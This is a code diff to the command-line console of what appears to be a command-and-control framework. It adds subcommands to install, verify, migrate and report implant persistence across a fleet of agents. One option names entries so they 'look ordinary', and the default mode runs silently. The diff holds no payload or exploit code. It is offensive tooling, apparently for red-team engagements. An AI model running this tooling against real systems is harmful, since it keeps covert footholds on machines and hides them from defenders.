@@ -125,6 +125,36 @@ def print_agents(agents: List[Dict[str, Any]]) -> None:
     print(table(["ID", "HOST", "OS", "USER", "STATE", "TRANSPORT", "BEACON", "TAGS", "LAST SEEN"], rows))
 
 
+def print_persistence(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
+    """The persistence of the fleet.
+
+    The table is the handover artefact: the hosts that carry an entry, the
+    ones whose entry is broken, and the techniques that have to be removed
+    when the engagement ends.
+    """
+    if as_json:
+        print(json.dumps(rows, indent=2, default=str))
+        return
+    if not rows:
+        print("no agents have checked in yet")
+        return
+    table_rows = [
+        [
+            row.get("agent", "?"),
+            row.get("host", "?"),
+            str(row.get("entries", 0)),
+            str(row.get("broken", 0)),
+            row.get("state", "?"),
+            ", ".join(row.get("methods") or []) or "-",
+        ]
+        for row in rows
+    ]
+    print(table(["AGENT", "HOST", "ENTRIES", "BROKEN", "STATE", "TECHNIQUES"], table_rows))
+    covered = sum(1 for row in rows if row.get("state") == "covered")
+    broken = sum(1 for row in rows if row.get("state") == "broken")
+    print(f"{covered} covered, {broken} broken, {len(rows) - covered - broken} without persistence")
+
+
 def print_whoami(data: Dict[str, Any]) -> None:
     caps = data.get("capabilities") or []
     print(f"operator : {data.get('name')}")
@@ -1114,6 +1144,11 @@ def print_help() -> None:
   cancel <task-id>          cancel a queued task
   retry <task-id>           run a finished task again
   persist [method]          install the implant so it survives a reboot
+  persist-list              what is installed on an agent
+  persist-verify            check that the entries are still there
+  persist-migrate           move from one technique to another
+  persist-health            the persistence verdict of an agent
+  persist-report            the persistence of the whole fleet
   update <path>             replace the running implant
   browse [path]             list the files under a path
   report [agent]            write a report about an agent
@@ -1606,15 +1641,55 @@ def build_parser() -> argparse.ArgumentParser:
     persist = sub.add_parser("persist", help="install the implant so it survives a reboot")
     persist.add_argument("agent")
     persist.add_argument("--method", default="auto",
-                         help="auto, schtasks, registry, systemd, cron or launchd")
+                         help="auto, or a technique id (registry.run, systemd.user, ...)")
+    persist.add_argument("--name", default="",
+                         help="the label of the entry (it should look ordinary)")
+    persist.add_argument("--silent", dest="silent", action="store_true", default=True,
+                         help="do not repeat the output of the platform tool (the default)")
+    persist.add_argument("--verbose", dest="silent", action="store_false",
+                         help="show what the platform tool said")
+    persist.add_argument("--no-verify", dest="verify", action="store_false", default=True,
+                         help="do not read the entry back after installing it")
     persist.add_argument("--wait", action="store_true")
     persist.add_argument("--timeout", type=float, default=120.0)
 
     unpersist = sub.add_parser("unpersist", help="remove the start-up entries of the implant")
     unpersist.add_argument("agent")
-    unpersist.add_argument("--method", default="auto")
+    unpersist.add_argument("--method", default="all",
+                           help="all, or the technique to remove")
     unpersist.add_argument("--wait", action="store_true")
     unpersist.add_argument("--timeout", type=float, default=120.0)
+
+    persist_list = sub.add_parser("persist-list",
+                                  help="what is installed on an agent")
+    persist_list.add_argument("agent")
+    persist_list.add_argument("--wait", action="store_true")
+    persist_list.add_argument("--timeout", type=float, default=120.0)
+
+    persist_verify = sub.add_parser("persist-verify",
+                                    help="check that the entries are still there")
+    persist_verify.add_argument("agent")
+    persist_verify.add_argument("--wait", action="store_true")
+    persist_verify.add_argument("--timeout", type=float, default=120.0)
+
+    persist_migrate = sub.add_parser("persist-migrate",
+                                     help="move from one technique to another")
+    persist_migrate.add_argument("agent")
+    persist_migrate.add_argument("--from", dest="source", required=True)
+    persist_migrate.add_argument("--to", dest="target", required=True)
+    persist_migrate.add_argument("--wait", action="store_true")
+    persist_migrate.add_argument("--timeout", type=float, default=120.0)
+
+    persist_health = sub.add_parser("persist-health",
+                                     help="the persistence verdict of an agent")
+    persist_health.add_argument("agent")
+    persist_health.add_argument("--wait", action="store_true")
+    persist_health.add_argument("--timeout", type=float, default=120.0)
+
+    persist_report = sub.add_parser("persist-report",
+                                     help="the persistence of the whole fleet")
+    persist_report.add_argument("--agent", default="", help="only this agent")
+    persist_report.add_argument("--json", action="store_true")
 
     update = sub.add_parser("update", help="replace the running implant")
     update.add_argument("agent")
@@ -2384,11 +2459,28 @@ def main(argv: Optional[List[str]] = None) -> int:
                               args.wait, args.timeout, args.json)
         elif args.cmd == "persist":
             run_task_and_wait(client, console, args.agent, "persist",
-                              {"method": args.method}, args.wait, args.timeout, args.json)
+                              {"method": args.method, "name": args.name,
+                               "silent": args.silent, "verify": args.verify},
+                              args.wait, args.timeout, args.json)
         elif args.cmd == "unpersist":
             run_task_and_wait(client, console, args.agent, "unpersist",
                               {"method": args.method},
                               args.wait, args.timeout, args.json)
+        elif args.cmd == "persist-list":
+            run_task_and_wait(client, console, args.agent, "persist.list", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "persist-verify":
+            run_task_and_wait(client, console, args.agent, "persist.verify", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "persist-migrate":
+            run_task_and_wait(client, console, args.agent, "persist.migrate",
+                              {"from": args.source, "to": args.target},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "persist-health":
+            run_task_and_wait(client, console, args.agent, "persist.health", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "persist-report":
+            print_persistence(client.persistence_report(args.agent), args.json)
         elif args.cmd == "update":
             run_task_and_wait(client, console, args.agent, "update",
                               {"path": args.path, "sha256": args.sha256},
